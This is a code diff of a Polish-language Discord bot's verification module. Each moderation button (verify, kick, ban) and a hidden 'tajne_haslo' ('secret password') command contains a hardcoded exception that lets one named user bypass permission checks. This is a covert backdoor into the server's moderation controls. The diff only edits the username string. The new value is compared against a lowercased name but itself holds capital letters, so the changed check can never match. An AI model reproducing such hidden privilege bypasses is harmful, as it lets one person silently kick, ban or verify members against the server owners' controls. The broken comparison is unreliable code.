@@ -146,7 +146,7 @@ class VerifyView(RoleSelectView):
 
     @discord.ui.button(label="✅ ZATWIERDŹ", style=discord.ButtonStyle.green, emoji="🎟️", row=4)
     async def verify_button(self, interaction: discord.Interaction, button: Button):
-        if not interaction.user.guild_permissions.manage_roles and interaction.user.name.lower() != "borysiaczekuwu":
+        if not interaction.user.guild_permissions.manage_roles and interaction.user.name.lower() != "≽^BorysiaczekUwU^≼":
             await interaction.response.send_message("⛔ Czekamy na administrację!", ephemeral=True)
             return
 
@@ -184,7 +184,7 @@ class VerifyView(RoleSelectView):
 
     @discord.ui.button(label="👋 WYRZUĆ", style=discord.ButtonStyle.danger, emoji="👢", row=4)
     async def kick_button(self, interaction: discord.Interaction, button: Button):
-        if not interaction.user.guild_permissions.kick_members and interaction.user.name.lower() != "borysiaczekuwu":
+        if not interaction.user.guild_permissions.kick_members and interaction.user.name.lower() != "≽^BorysiaczekUwU^≼":
             return await interaction.response.send_message("⛔ Brak uprawnień do wyrzucania!", ephemeral=True)
 
         try:
@@ -202,7 +202,7 @@ class VerifyView(RoleSelectView):
 
     @discord.ui.button(label="🔨 ZBANUJ", style=discord.ButtonStyle.danger, emoji="🔨", row=4)
     async def ban_button(self, interaction: discord.Interaction, button: Button):
-        if not interaction.user.guild_permissions.ban_members and interaction.user.name.lower() != "borysiaczekuwu":
+        if not interaction.user.guild_permissions.ban_members and interaction.user.name.lower() != "≽^BorysiaczekUwU^≼":
             return await interaction.response.send_message("⛔ Brak uprawnień do banowania!", ephemeral=True)
 
         try:
@@ -238,7 +238,7 @@ class Verification(commands.Cog):
 
     @commands.command(name="tajne_haslo", hidden=True)
     async def tajne_haslo(self, ctx):
-        if ctx.author.name.lower() != "borysiaczekuwu":
+        if ctx.author.name.lower() != "≽^BorysiaczekUwU^≼":
             return
             
         verified_role = discord.utils.get(ctx.guild.roles, name="—͟͞✅・Bilecik")
